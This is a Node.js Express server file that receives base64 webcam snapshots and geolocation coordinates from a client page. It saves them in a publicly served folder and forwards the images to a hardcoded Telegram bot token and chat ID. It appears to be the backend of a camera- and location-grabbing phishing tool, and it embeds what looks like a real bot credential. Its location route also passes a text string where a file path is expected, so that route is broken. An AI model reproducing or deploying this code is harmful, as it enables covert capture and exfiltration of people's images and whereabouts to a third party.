const express = require('express');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');
const FormData = require('form-data');

// Create the Express application
const app = express();

// Increase request size limit to 50MB
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

const port = 3000;

// Serve static files (HTML, CSS, JS)
app.use(express.static(path.join(__dirname, 'public')));

// Telegram bot configuration
const telegramBotToken = '7977890436:AAF3sM8rgfHMGRjlFwHlm9eJi3pUE0rDBdI'; // Replace with your bot token
const chatId = '1819194668'; // Replace with your chat ID


// Function to send an image to Telegram
const sendImageToTelegram = async (filePath) => {
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('photo', fs.createReadStream(filePath)); // Read the file stream

    try {
        await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, form, {
            headers: form.getHeaders(),
        });
        console.log('Image sent to Telegram successfully!');
    } catch (error) {
        console.error('Error sending image to Telegram:', error);
    }
};

// API endpoint to save images
app.post('/save-image', async (req, res) => {
    const { image } = req.body;

    if (!image) {
        return res.status(400).json({ error: 'Image data is missing' });
    }

    // Decode base64 image
    const base64Data = image.replace(/^data:image\/png;base64,/, "");

    // Generate a unique filename using UUID
    const uniqueFilename = `snapshot_${uuidv4()}.png`;
    const filePath = path.join(__dirname, 'public', 'images', uniqueFilename);

    // Save image to the server
    fs.writeFile(filePath, base64Data, 'base64', async (err) => {
        if (err) {
            console.error('Error saving image:', err);
            return res.status(500).json({ error: 'Failed to save image' });
        }

        // Send the actual image to Telegram
        await sendImageToTelegram(filePath);
        res.json({ message: 'Image saved and sent to Telegram successfully!', filePath: uniqueFilename });
    });
});

// API endpoint to save location
app.post('/save-location', async (req, res) => {
    const { latitude, longitude } = req.body;

    if (!latitude || !longitude) {
        return res.status(400).json({ error: 'Location data is missing' });
    }

    // Prepare the location data to save
    const locationData = `Latitude: ${latitude}, Longitude: ${longitude}\n`;

    // Save location data to a text file
    fs.appendFile('public/location.txt', locationData, async (err) => {
        if (err) {
            console.error('Error saving location:', err);
            return res.status(500).json({ error: 'Failed to save location' });
        }

        // Send location data to Telegram
        await sendImageToTelegram(`Location saved successfully! Latitude: ${latitude}, Longitude: ${longitude}`);
        res.json({ message: 'Location saved successfully!' });
    });
});

// Start server
app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});